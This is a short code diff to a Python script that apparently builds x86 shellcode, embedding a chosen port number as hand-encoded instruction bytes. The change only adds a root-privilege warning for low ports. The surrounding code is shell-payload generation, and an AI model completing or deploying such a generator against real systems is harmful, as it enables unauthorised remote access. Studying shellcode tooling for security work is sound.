@@ -20,6 +20,9 @@ if port > 65535:
     print('ERROR: Port number cannot be greater than 65535.')
     raise SystemExit
 
+if port < 1024:
+    print('WARN: Port numbers below 1024 can only be bound by root!')
+
 if port < 256:
     if len(hex(port)) < 4:
         hexport = '0' + hex(port)[-1:]
@@ -30,7 +33,6 @@ if port < 256:
                           bytearray.fromhex(hexport).decode('iso-8859-1') +
                           "\x66\x52" +  # push word dx
                           "\x31\xd2")  # xor edx, edx
-
 elif hex(port)[-2:] == '00':
     HANDLE_PORT_NUMBER = ("\x80\xc2" +  # add dl <port number high bytes>
                           bytearray.fromhex(hex(port)[2:4]).decode('iso-8859-1') +
